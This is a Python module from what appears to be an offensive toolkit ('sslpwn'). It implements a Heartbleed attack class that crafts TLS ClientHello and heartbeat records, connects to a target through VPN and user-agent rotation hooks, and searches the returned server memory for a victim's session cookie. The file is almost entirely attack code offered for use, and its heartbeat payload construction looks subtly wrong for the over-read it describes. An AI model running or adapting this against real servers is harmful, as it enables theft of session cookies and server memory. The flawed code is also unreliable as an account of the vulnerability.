"""
Heartbleed attack implementation (CVE-2014-0160).

Exploits the TLS heartbeat extension to read server memory.
"""

import socket
import struct
import time
import os
from typing import Optional

from sslpwn.attacks.base import BaseAttack


class HeartbleedAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def _build_client_hello(self, hostname: str) -> bytes:
        content_type = 22
        version = 0x0301
        gmt_unix_time = int(time.time())
        random_bytes = os.urandom(28)
        session_id = b""
        cipher_suites = b"\x00\x02\x00\x2f"
        compression = b"\x01\x00"
        ext_heartbeat = struct.pack("!HH", 15, 1) + b"\x01"
        extensions = struct.pack("!H", len(ext_heartbeat)) + ext_heartbeat
        handshake_body = (
            struct.pack("!H", 0x0301) +
            gmt_unix_time.to_bytes(4, 'big') + random_bytes +
            struct.pack("!B", len(session_id)) + session_id +
            struct.pack("!H", len(cipher_suites)) + cipher_suites +
            struct.pack("!B", len(compression)) + compression +
            struct.pack("!H", len(extensions)) + extensions
        )
        handshake = b"\x01" + struct.pack("!I", len(handshake_body))[1:] + handshake_body
        record = struct.pack("!BHH", content_type, version, len(handshake)) + handshake
        return record

    def _build_heartbeat_request(self, payload_length: int) -> bytes:
        content_type = 24
        version = 0x0301
        heartbeat_type = 1
        payload = b"A" * min(payload_length, 65535)
        padding = b" " * 16
        heartbeat_msg = struct.pack("!BH", heartbeat_type, payload_length) + payload + padding
        record = struct.pack("!BHH", content_type, version, len(heartbeat_msg)) + heartbeat_msg
        return record

    def check_vulnerability(self) -> bool:
        """Check if server responds to a heartbeat request."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = socket.create_connection((hostname, port), timeout=5)
            sock.send(client_hello)
            sock.settimeout(3)
            server_resp = sock.recv(4096)
            if not server_resp:
                return False
            # send a heartbeat request
            heartbeat_req = self._build_heartbeat_request(1)  # small size
            sock.send(heartbeat_req)
            resp = sock.recv(4096)
            sock.close()
            return resp and resp[0] == 24  # heartbeat response
        except Exception:
            return False

    def exploit(self) -> bool:
        """Full Heartbleed memory leak."""
        self.output.log("Starting Heartbleed attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False

        sock.send(client_hello)
        try:
            sock.settimeout(5)
            server_resp = sock.recv(4096)
        except socket.timeout:
            server_resp = b""
        if not server_resp:
            self.output.log("No response from server", "ERROR")
            sock.close()
            return False

        heartbeat_req = self._build_heartbeat_request(0x4000)
        sock.send(heartbeat_req)
        try:
            leaked = sock.recv(65535)
        except socket.timeout:
            leaked = b""
        sock.close()

        if len(leaked) < 3:
            self.output.log("No heartbeat response", "ERROR")
            return False
        if leaked[0] != 24:
            self.output.log("Not a heartbeat response", "ERROR")
            return False
        record_length = struct.unpack_from("!H", leaked, 3)[0]
        heartbeat_msg = leaked[5:5+record_length]
        if len(heartbeat_msg) < 3:
            self.output.log("Heartbeat message too short", "ERROR")
            return False
        resp_type, resp_payload_len = struct.unpack_from("!BH", heartbeat_msg, 0)
        if resp_type != 2:
            self.output.log("Unexpected heartbeat type", "ERROR")
            return False
        leaked_payload = heartbeat_msg[3:3+resp_payload_len]

        target = f"{self.cookie_name}={self.cookie_value}".encode()
        if target in leaked_payload:
            self.output.log(f"Cookie found in leaked memory: {self.cookie_value}", "SUCCESS")
            return True
        else:
            self.output.log("Cookie not found in leaked memory", "WARN")
            return False